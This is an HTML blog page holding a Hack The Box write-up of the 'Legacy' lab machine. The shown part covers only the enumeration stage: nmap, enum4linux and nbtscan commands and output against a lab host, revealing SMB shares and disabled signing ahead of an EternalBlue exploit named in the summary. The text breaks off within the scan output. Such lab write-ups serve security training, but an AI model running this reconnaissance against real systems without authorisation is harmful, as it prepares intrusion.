@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hack The Box :: Legacy :: m1thryn.github.io</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="TL;DR: EternalBlue
+Enumeration  Starting with an nmap scan&amp;hellip;
+Nmap # Nmap 7.91 scan initiated Sat Jan 2 01:42:31 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /results/scans/nmap/full_tcp_nmap.txt -oX /results/scans/xml/full_tcp_nmap.xml 10.10.10.4 Nmap scan report for 10.10.10.4 Host is up, received user-set (0.14s latency). Scanned at 2021-01-02 01:42:31 UTC for 331s Not shown: 65532 filtered ports Reason: 65532 no-responses PORT STATE SERVICE REASON VERSION 139/tcp open netbios-ssn syn-ack ttl 126 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 126 Windows XP microsoft-ds 3389/tcp closed ms-wbt-server reset ttl 126 Device type: general purpose|specialized|media device Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|2008|PocketPC/CE (93%), General Dynamics embedded (85%), Cisco embedded (85%), Motorola embedded (85%) OS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/h:cisco:isb7150 cpe:/o:microsoft:windows_ce:5." />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/htb-legacy/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/img/favicon/toxic-24.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="m1thryn" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack The Box :: Legacy :: m1thryn.github.io">
+<meta property="og:description" content="TL;DR: EternalBlue" />
+<meta property="og:url" content="/posts/htb-legacy/" />
+<meta property="og:site_name" content="Hack The Box :: Legacy" />
+
+  <meta property="og:image" content="/">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-01-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    m1thryn.github.io
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/recommendations">Recommendations</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/recommendations">Recommendations</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/htb-legacy/">Hack The Box :: Legacy</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-01-01 
+      </span>
+    
+    
+    <span class="post-author">:: m1thryn</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/htb/">htb</a>&nbsp;
+    
+    #<a href="/tags/r00ted/">r00ted</a>&nbsp;
+    
+    #<a href="/tags/oscp/">oscp</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        
+  <img src="/htb-legacy/legacy.png"  alt="HTB Legacy"  class="center"  style="border-radius: 16px;"  />
+
+
+<p>TL;DR: EternalBlue</p>
+<h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>Starting with an nmap scan&hellip;</p>
+<h3 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-apache" data-lang="apache"><span style="color:#75715e"># Nmap 7.91 scan initiated Sat Jan  2 01:42:31 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /results/scans/nmap/full_tcp_nmap.txt -oX /results/scans/xml/full_tcp_nmap.xml 10.10.10.4</span>
+Nmap scan report for <span style="color:#ae81ff">10.10.10.4</span>
+Host is up, received <span style="color:#66d9ef">user</span>-set (0.14s latency).
+Scanned at <span style="color:#ae81ff">2021</span>-01-02 <span style="color:#ae81ff">01</span>:42:31 UTC for <span style="color:#ae81ff">331</span>s
+Not shown: <span style="color:#ae81ff">65532</span> filtered ports
+<span style="color:#960050;background-color:#1e0010">Reason:</span> <span style="color:#960050;background-color:#1e0010">65532</span> <span style="color:#960050;background-color:#1e0010">no-</span>responses
+PORT     STATE  SERVICE       REASON          VERSION
+<span style="color:#960050;background-color:#1e0010">139/</span>tcp  open   netbios-ssn   syn-ack ttl <span style="color:#ae81ff">126</span> Microsoft Windows netbios-ssn
+<span style="color:#960050;background-color:#1e0010">445/</span>tcp  open   microsoft-ds  syn-ack ttl <span style="color:#ae81ff">126</span> Windows XP microsoft-ds
+<span style="color:#960050;background-color:#1e0010">3389/</span>tcp closed ms-wbt-server reset ttl <span style="color:#ae81ff">126</span>
+Device type: general purpose|specialized|media device
+Running (JUST GUESSING): Microsoft Windows <span style="color:#ae81ff">2000</span>|XP|2003|2008|PocketPC/CE (93%), General Dynamics embedded (85%), Cisco embedded (85%), Motorola embedded (85%)
+OS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/h:cisco:isb7150 cpe:/o:microsoft:windows_ce:5.0 cpe:/h:motorola:vip1200
+OS fingerprint not ideal because: Didn&#39;t receive UDP response. Please try again with -sSU
+Aggressive <span style="color:#66d9ef">OS</span> guesses: Microsoft Windows <span style="color:#ae81ff">2000</span> SP4 (93%), Microsoft Windows XP SP3 (93%), Microsoft Windows Server <span style="color:#ae81ff">2003</span> SP2 (92%), Microsoft Windows Server <span style="color:#ae81ff">2003</span> SP1 or SP2 (91%), Microsoft Windows <span style="color:#ae81ff">2000</span> SP0 (91%), Microsoft Windows XP (91%), Microsoft Windows <span style="color:#ae81ff">2003</span> SP2 (90%), Microsoft Windows XP SP2 or Windows Server <span style="color:#ae81ff">2003</span> (90%), Microsoft Windows XP SP2 or SP3 (89%), Microsoft Windows XP SP2 (89%)
+No exact <span style="color:#66d9ef">OS</span> matches for host (test conditions non-ideal).
+<span style="color:#960050;background-color:#1e0010">TCP/</span>IP fingerprint:
+<span style="color:#960050;background-color:#1e0010">SCAN(V=7</span>.<span style="color:#960050;background-color:#1e0010">91%E=4%D=1/2%OT=139%CT=3389%CU=%PV=Y%DS=3%DC=T%G=N%TM=5FEFD0D2%P=x86_64-pc-linux-gnu)</span>
+<span style="color:#960050;background-color:#1e0010">SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%TS=0)</span>
+<span style="color:#960050;background-color:#1e0010">OPS(O1=M54DNW0NNT00NNS%O2=M54DNW0NNT00NNS%O3=M54DNW0NNT00%O4=M54DNW0NNT00NNS%O5=M54DNW0NNT00NNS%O6=M54DNNT00NNS)</span>
+<span style="color:#960050;background-color:#1e0010">WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%W6=FAF0)</span>
+<span style="color:#960050;background-color:#1e0010">ECN(R=Y%DF=Y%TG=80%W=FAF0%O=M54DNW0NNS%CC=N%Q=)</span>
+<span style="color:#960050;background-color:#1e0010">T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)</span>
+<span style="color:#960050;background-color:#1e0010">T2(R=N)</span>
+<span style="color:#960050;background-color:#1e0010">T3(R=N)</span>
+<span style="color:#960050;background-color:#1e0010">T4(R=Y%DF=N%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)</span>
+<span style="color:#960050;background-color:#1e0010">T5(R=Y%DF=N%TG=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)</span>
+<span style="color:#960050;background-color:#1e0010">T6(R=Y%DF=N%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)</span>
+<span style="color:#960050;background-color:#1e0010">T7(R=N)</span>
+<span style="color:#960050;background-color:#1e0010">U1(R=N)</span>
+<span style="color:#960050;background-color:#1e0010">IE(R=N)</span>
+
+Network Distance: <span style="color:#ae81ff">3</span> hops
+TCP Sequence Prediction: Difficulty=258 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service <span style="color:#66d9ef">Info</span>: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host <span style="color:#66d9ef">script</span> results:
+<span style="color:#960050;background-color:#1e0010">|_clock-skew:</span> <span style="color:#960050;background-color:#1e0010">mean:</span> <span style="color:#960050;background-color:#1e0010">5d00h58m17s,</span> <span style="color:#960050;background-color:#1e0010">deviation:</span> <span style="color:#960050;background-color:#1e0010">1h24m50s,</span> <span style="color:#960050;background-color:#1e0010">median:</span> <span style="color:#960050;background-color:#1e0010">4</span>d23h58m17s
+| nbstat: NetBIOS name: LEGACY, NetBIOS <span style="color:#66d9ef">user</span>: &lt;unknown&gt;, NetBIOS MAC: <span style="color:#ae81ff">00</span>:50:56:b9:c9:5c (VMware)
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">Names:</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">LEGACY</span><span style="color:#f92672">&lt;00&gt;</span>           <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;unique&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">HTB</span><span style="color:#f92672">&lt;00&gt;</span>              <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;group&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">LEGACY</span><span style="color:#f92672">&lt;20&gt;</span>           <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;unique&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">HTB</span><span style="color:#f92672">&lt;1e&gt;</span>              <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;group&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">HTB</span><span style="color:#f92672">&lt;1d&gt;</span>              <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;unique&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">\x01\x02__MSBROWSE__\x02</span><span style="color:#f92672">&lt;01&gt;</span>  <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;group&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">Statistics:</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">50</span> <span style="color:#960050;background-color:#1e0010">56</span> b9 c9 <span style="color:#ae81ff">5</span>c <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span>
+<span style="color:#960050;background-color:#1e0010">|_</span>  <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span>
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">p2p-conficker:</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>   Checking for Conficker.C or higher...
+<span style="color:#960050;background-color:#1e0010">|</span>   Check <span style="color:#ae81ff">1</span> (port <span style="color:#ae81ff">40600</span><span style="color:#e6db74">/tcp</span>): CLEAN (Timeout)
+<span style="color:#960050;background-color:#1e0010">|</span>   Check <span style="color:#ae81ff">2</span> (port <span style="color:#ae81ff">14266</span><span style="color:#e6db74">/tcp</span>): CLEAN (Timeout)
+<span style="color:#960050;background-color:#1e0010">|</span>   Check <span style="color:#ae81ff">3</span> (port <span style="color:#ae81ff">50902</span><span style="color:#e6db74">/udp</span>): CLEAN (Timeout)
+<span style="color:#960050;background-color:#1e0010">|</span>   Check <span style="color:#ae81ff">4</span> (port <span style="color:#ae81ff">64786</span><span style="color:#e6db74">/udp</span>): CLEAN (Timeout)
+<span style="color:#960050;background-color:#1e0010">|_</span>  <span style="color:#960050;background-color:#1e0010">0/4</span> checks are positive: Host is CLEAN or ports are blocked
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">smb-os-discovery:</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">OS:</span> Windows XP (Windows <span style="color:#ae81ff">2000</span> LAN Manager)
+<span style="color:#960050;background-color:#1e0010">|</span>   OS CPE: cpe:/o:microsoft:windows_xp::-
+<span style="color:#960050;background-color:#1e0010">|</span>   Computer name: legacy
+<span style="color:#960050;background-color:#1e0010">|</span>   NetBIOS computer name: LEGACY\x00
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">Workgroup:</span> <span style="color:#960050;background-color:#1e0010">HTB\</span>x00
+|_  System time: <span style="color:#ae81ff">2021</span>-01-07T05:45:28+02:00
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">smb-security-mode:</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">account_used:</span> guest
+|   authentication_level: <span style="color:#66d9ef">user</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">challenge_response:</span> supported
+|_  message_signing: disabled (dangerous, but default)
+<span style="color:#960050;background-color:#1e0010">|_smb2-security-mode:</span> <span style="color:#960050;background-color:#1e0010">Couldn&#39;</span>t establish a SMBv2 connection.
+<span style="color:#960050;background-color:#1e0010">|_smb2-time:</span> Protocol negotiation failed (SMB2)
+
+TRACEROUTE (using port <span style="color:#ae81ff">3389</span><span style="color:#e6db74">/tcp</span>)
+HOP RTT       ADDRESS
+<span style="color:#960050;background-color:#1e0010">1</span>   <span style="color:#960050;background-color:#1e0010">0</span>.<span style="color:#960050;background-color:#1e0010">31</span> ms   <span style="color:#ae81ff">172.17.0.1</span>
+<span style="color:#960050;background-color:#1e0010">2</span>   <span style="color:#960050;background-color:#1e0010">134</span>.<span style="color:#960050;background-color:#1e0010">27</span> ms <span style="color:#ae81ff">10.10.14.1</span>
+<span style="color:#960050;background-color:#1e0010">3</span>   <span style="color:#960050;background-color:#1e0010">134</span>.<span style="color:#960050;background-color:#1e0010">52</span> ms <span style="color:#ae81ff">10.10.10.4</span>
+
+Read data files from: <span style="color:#e6db74">/usr/bin/../share/nmap</span>
+OS and Service detection performed. Please report <span style="color:#66d9ef">any</span> incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sat Jan  2 01:48:02 2021 -- 1 IP address (1 host up) scanned in 330.94 seconds</span>
+</code></pre></div><h3 id="smb">SMB<a href="#smb" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>enum4linux</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-apache" data-lang="apache">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) <span style="color:#66d9ef">on</span> Sat Jan  <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">01</span>:43:40 <span style="color:#ae81ff">2021</span>
+
+ <span style="color:#960050;background-color:#1e0010">==========================</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>    Target Information    |
+ <span style="color:#960050;background-color:#1e0010">==========================</span> 
+Target ........... <span style="color:#ae81ff">10.10.10.4</span>
+RID Range ........ <span style="color:#ae81ff">500</span>-550,1000-1050
+Username ......... &#39;&#39;
+Password ......... &#39;&#39;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, <span style="color:#66d9ef">none</span>
+
+
+ <span style="color:#960050;background-color:#1e0010">==================================================</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>    Enumerating Workgroup/Domain <span style="color:#66d9ef">on</span> <span style="color:#ae81ff">10.10.10.4</span>    |
+ <span style="color:#960050;background-color:#1e0010">==================================================</span> 
+<span style="color:#960050;background-color:#1e0010">[+]</span> Got domain/workgroup name: HTB
+
+ <span style="color:#960050;background-color:#1e0010">==========================================</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>    Nbtstat Information for <span style="color:#ae81ff">10.10.10.4</span>    |
+ <span style="color:#960050;background-color:#1e0010">==========================================</span> 
+Looking up status of <span style="color:#ae81ff">10.10.10.4</span>
+	LEGACY          &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+	HTB             &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+	LEGACY          &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+	HTB             &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+	HTB             &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
+	..<span style="color:#960050;background-color:#1e0010">__MSBROWSE__</span>. <span style="color:#f92672">&lt;01&gt;</span> <span style="color:#960050;background-color:#1e0010">-</span> <span style="color:#f92672">&lt;GROUP&gt;</span> B &lt;ACTIVE&gt;  Master Browser
+
+	MAC Address = <span style="color:#ae81ff">00</span>-50-56-B9-C9-5C
+
+ <span style="color:#960050;background-color:#1e0010">===================================</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>    Session Check <span style="color:#66d9ef">on</span> <span style="color:#ae81ff">10.10.10.4</span>    |
+ <span style="color:#960050;background-color:#1e0010">===================================</span> 
+<span style="color:#960050;background-color:#1e0010">[E]</span> Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.
+</code></pre></div><p>nbtscan</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-apache" data-lang="apache">Doing NBT name scan for addresses from <span style="color:#ae81ff">10.10.10.4</span>
+
+
+NetBIOS Name Table for Host <span style="color:#ae81ff">10.10.10.4</span>:
+
+Name             Service          Type             
+<span style="color:#960050;background-color:#1e0010">----------------------------------------</span>
+LEGACY           Workstation Service
+HTB              Domain Name
+LEGACY           File Server Service
+HTB              Browser Service Elections
+HTB              Master Browser
+<span style="color:#960050;background-color:#1e0010">__MSBROWSE__</span>  Master Browser
+
+Adapter address: <span style="color:#ae81ff">00</span>:50:56:b9:c9:5c
+<span style="color:#960050;background-color:#1e0010">----------------------------------------</span>
+</code></pre></div><p>Nmap SMB Scripts</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-apache" data-lang="apache"><span style="color:#75715e"># Nmap 7.91 scan initiated Sat Jan  2 01:43:40 2021 as: nmap -vv --reason -Pn -sV -p 445 &#34;--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)&#34; --script-args=unsafe=1 -oN /results/scans/recon/tcp_445_smb_nmap.txt -oX /results/scans/xml/tcp_445_smb_nmap.xml 10.10.10.4</span>
+Nmap scan report for <span style="color:#ae81ff">10.10.10.4</span>
+Host is up, received <span style="color:#66d9ef">user</span>-set (0.14s latency).
+Scanned at <span style="color:#ae81ff">2021</span>-01-02 <span style="color:#ae81ff">01</span>:43:40 UTC for <span style="color:#ae81ff">135</span>s
+
+PORT    STATE SERVICE      REASON          VERSION
+<span style="color:#960050;background-color:#1e0010">445/</span>tcp open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">126</span> Windows XP microsoft-ds
+<span style="color:#960050;background-color:#1e0010">|_smb-enum-services:</span> <span style="color:#960050;background-color:#1e0010">ERROR:</span> Script execution failed (use -d to <span style="color:#66d9ef">debug</span>)
+Service <span style="color:#66d9ef">Info</span>: <span style="color:#66d9ef">OS</span>: Windows XP; CPE: cpe:/o:microsoft:windows_xp
+
+Host <span style="color:#66d9ef">script</span> results:
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">nbstat:</span> NetBIOS name: LEGACY, NetBIOS <span style="color:#66d9ef">user</span>: &lt;unknown&gt;, NetBIOS MAC: <span style="color:#ae81ff">00</span>:50:56:b9:c9:5c (VMware)
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">Names:</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">LEGACY</span><span style="color:#f92672">&lt;00&gt;</span>           <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;unique&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">HTB</span><span style="color:#f92672">&lt;00&gt;</span>              <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;group&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">LEGACY</span><span style="color:#f92672">&lt;20&gt;</span>           <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;unique&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">HTB</span><span style="color:#f92672">&lt;1e&gt;</span>              <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;group&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">HTB</span><span style="color:#f92672">&lt;1d&gt;</span>              <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;unique&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">\x01\x02__MSBROWSE__\x02</span><span style="color:#f92672">&lt;01&gt;</span>  <span style="color:#960050;background-color:#1e0010">Flags:</span> <span style="color:#f92672">&lt;group&gt;&lt;active&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">Statistics:</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">50</span> <span style="color:#960050;background-color:#1e0010">56</span> b9 c9 <span style="color:#ae81ff">5</span>c <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span>
+<span style="color:#960050;background-color:#1e0010">|_</span>  <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span>
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">smb-enum-shares:</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">note:</span> <span style="color:#960050;background-color:#1e0010">ERROR:</span> Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">account_used:</span> <span style="color:#f92672">&lt;blank&gt;</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">\\10</span>.<span style="color:#960050;background-color:#1e0010">10</span>.<span style="color:#960050;background-color:#1e0010">10</span>.<span style="color:#960050;background-color:#1e0010">4\ADMIN$:</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>     <span style="color:#960050;background-color:#1e0010">warning:</span> <span style="color:#960050;background-color:#1e0010">Couldn&#39;</span>t get details for share: NT_STATUS_ACCESS_DENIED
+<span style="color:#960050;background-color:#1e0010">|</span>     Anonymous access: &lt;none&gt;
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">\\10</span>.<span style="color:#960050;background-color:#1e0010">10</span>.<span style="color:#960050;background-color:#1e0010">10</span>.<span style="color:#960050;background-color:#1e0010">4\C$:</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>     <span style="color:#960050;background-color:#1e0010">warning:</span> <span style="color:#960050;background-color:#1e0010">Couldn&#39;</span>t get details for share: NT_STATUS_ACCESS_DENIED
+<span style="color:#960050;background-color:#1e0010">|</span>     Anonymous access: &lt;none&gt;
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">\\10</span>.<span style="color:#960050;background-color:#1e0010">10</span>.<span style="color:#960050;background-color:#1e0010">10</span>.<span style="color:#960050;background-color:#1e0010">4\IPC$:</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>     <span style="color:#960050;background-color:#1e0010">warning:</span> <span style="color:#960050;background-color:#1e0010">Couldn&#39;</span>t get details for share: NT_STATUS_ACCESS_DENIED
+<span style="color:#960050;background-color:#1e0010">|_</span>    Anonymous access: READ
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">smb-mbenum:</span> 
